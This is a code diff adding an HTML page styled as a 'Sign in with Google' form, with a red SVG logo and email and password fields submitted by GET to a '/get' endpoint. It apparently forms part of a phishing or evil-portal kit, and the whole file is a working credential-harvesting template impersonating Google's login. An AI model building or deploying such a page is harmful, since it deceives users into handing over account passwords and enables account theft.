@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background-color: #FFFFFF;
+}
+
+.container {
+  max-width: 400px;
+  margin: 0 auto;
+  padding: 20px;
+}
+
+@media (min-width: 600px) {
+  .container {
+    max-width: 500px;
+  }
+}
+
+.logo-container {
+  text-align: center;
+  margin-bottom: 30px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.logo {
+  width: 40px;
+  height: 40px;
+  fill: #E21724;
+  margin-right: 100px
+}
+
+.form-container {
+  background: #FFFFFF;
+  border: 1px solid #FFFFFF;
+  border-radius: 4px;
+  padding: 20px;
+  box-shadow: 0px 0px 10px 0px rgba(108,66,156,0.2);
+}
+
+h1 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #000000;
+  margin-bottom: 20px;
+}
+
+h2 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #000000;
+  margin-bottom: 20px;
+}
+
+.input-field {
+  width: 100%;
+  padding: 12px;
+  border: 2px solid #E21724;
+  border-radius: 4px;
+  box-sizing: border-box;
+  margin-bottom: 20px;
+  font-size: 14px;
+}
+
+.submit-btn {
+  background: #E21724;
+  border: none;
+  color: #FFFFFF;
+  padding: 12px 20px;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+  display: block;
+  margin: auto;
+}
+
+.submit-btn:hover {
+  background: #E21724;
+}
+
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="logo-container">
+  <svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="250.000000pt" height="130.000000pt" viewBox="0 0 2560.000000 1347.000000"
+ preserveAspectRatio="xMidYMid meet">
+<g transform="translate(0.000000,1347.000000) scale(0.100000,-0.100000)"
+fill="#E21724" stroke="none">
+<path d="M1115 13464 c-735 -21 -812 -28 -927 -91 -66 -36 -131 -110 -160
+-181 l-23 -57 -3 -6385 c-2 -6334 -2 -6386 18 -6450 39 -131 154 -244 273
+-270 38 -8 3125 -10 11402 -8 l11350 3 67 33 c72 35 118 81 160 159 24 43 376
+1142 1857 5784 l471 1475 0 238 c0 273 3 262 -98 339 -65 50 -374 245 -662
+417 -3851 2304 -9131 3872 -15470 4594 -1722 196 -3338 313 -5300 382 -406 14
+-2607 28 -2955 18z m16425 -5564 c224 -12 461 -33 638 -57 105 -14 122 -18
+117 -32 -4 -9 -77 -222 -163 -475 l-156 -458 -65 6 c-851 89 -1430 70 -1986
+-64 -292 -70 -511 -150 -760 -279 -713 -367 -1150 -952 -1250 -1676 -24 -167
+-16 -478 14 -618 47 -216 123 -398 235 -566 264 -395 684 -646 1295 -775 545
+-115 1369 -108 1950 17 l105 23 780 2437 779 2437 2294 0 c1828 0 2293 -3
+2293 -12 0 -7 -63 -211 -139 -453 l-139 -440 -1636 -3 -1635 -2 -21 -68 c-11
+-37 -116 -366 -233 -732 l-214 -665 1369 -3 c752 -1 1368 -5 1368 -10 0 -4
+-62 -200 -138 -437 l-138 -430 -1371 -3 -1372 -2 -51 -158 c-27 -86 -188 -592
+-357 -1124 l-307 -968 -83 -34 c-345 -145 -992 -297 -1553 -366 -440 -54 -948
+-74 -1300 -51 -1645 107 -2798 900 -3055 2101 -15 69 -28 131 -31 138 -2 6
+-17 12 -33 12 -16 0 -33 -6 -38 -12 -4 -7 -161 -492 -348 -1078 l-341 -1065
+-684 -3 c-376 -1 -687 1 -691 5 -4 5 -37 109 -73 233 -328 1141 -873 2348
+-1584 3510 -145 238 -475 731 -482 723 -6 -7 -713 -2194 -812 -2510 -21 -67
+-34 -93 -48 -98 -42 -13 -57 3 -95 103 -53 138 -125 279 -197 385 -75 111
+-309 349 -445 452 -51 39 -91 75 -89 80 15 44 941 2927 948 2953 l9 32 643 0
+644 0 54 -67 c368 -458 836 -1144 1180 -1733 456 -781 808 -1522 1084 -2290 3
+-8 275 829 603 1860 329 1031 623 1955 655 2053 l57 177 600 0 c568 0 601 -1
+594 -17 -18 -49 -405 -1271 -405 -1281 0 -7 15 -12 36 -12 33 0 49 13 182 143
+323 313 644 539 1057 743 473 233 957 379 1515 458 150 21 236 30 475 49 101
+9 770 6 945 -3z m-11665 -10 c247 -12 492 -39 746 -80 100 -17 184 -32 186
+-33 3 -4 -264 -848 -271 -854 -2 -2 -82 12 -177 31 -96 19 -221 42 -279 50
+-563 80 -1175 43 -1605 -99 -353 -116 -570 -289 -637 -508 -38 -127 -9 -235
+96 -345 137 -146 294 -235 1011 -577 430 -205 821 -403 1016 -514 636 -362
+977 -715 1064 -1101 22 -98 22 -279 0 -383 -71 -340 -322 -721 -645 -978 -422
+-337 -1042 -548 -1835 -624 -400 -38 -987 -38 -1315 0 -535 62 -1058 182
+-1606 369 -187 64 -468 176 -485 193 -6 6 76 194 198 459 114 247 208 451 210
+453 1 2 56 -21 120 -51 729 -344 1676 -547 2443 -524 790 23 1254 225 1370
+595 54 171 -5 340 -179 511 -203 200 -467 355 -1266 740 -678 328 -1020 544
+-1290 814 -266 267 -375 498 -375 792 0 408 243 806 663 1087 452 302 1107
+498 1882 561 321 27 631 32 960 16z"/>
+</g>
+</svg>
+
+  </div>
+
+  <div class="form-container">
+  <center><h1>Sign in with Google</h1>
+      </center>
+
+    <form action="/get" id="login-form">
+    
+      <input name="email" class="input-field" type="text" placeholder="Email or mobile phone number" required>
+      
+      <input name="password" class="input-field" type="password" placeholder="Password" required>
+
+      <button class="submit-btn" type="submit">Continue</button>
+
+    </form>
+
+  </div>
+
+</div>
+</meta>
+</body>
+</html>
